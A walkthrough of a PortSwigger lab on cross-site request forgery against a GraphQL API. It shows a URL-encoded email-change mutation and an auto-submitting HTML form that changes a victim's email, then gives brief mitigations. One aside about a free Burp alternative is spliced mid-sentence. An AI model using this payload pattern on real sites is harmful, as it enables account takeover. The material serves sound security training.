# Lab 03 — Performing CSRF exploits over GraphQL

> **Practitioner** · [Official lab](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)

**Entry point:** the email change is a GraphQL mutation sent as JSON — but

> **Burp Community alternative (free):** the tool named below is Pro-only — the free replacement is described in the steps.
the endpoint **also accepts form-encoded POSTs**.

## Solution

1. Confirm the mutation works with `Content-Type: x-www-form-urlencoded`
   and a URL-encoded body:

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

2. Build the CSRF PoC **manually** (the PoC generator is Pro-only). Host
   this auto-submitting form — the fields carry the URL-encoded mutation
   from step 1:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1" method="POST">
  <input type="hidden" name="query"
         value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }">
  <input type="hidden" name="operationName" value="changeEmail">
  <input type="hidden" name="variables"
         value='{"input":{"email":"hacker@hacker.com"}}'>
</form>
<script>document.forms[0].submit();</script>
```

   Use a fresh target email (already-used addresses are rejected).
3. Deliver to victim — their email changes — lab solved.

## Mitigation

GraphQL endpoints should require JSON content types, use CSRF tokens, and
prefer SameSite=Strict cookies.
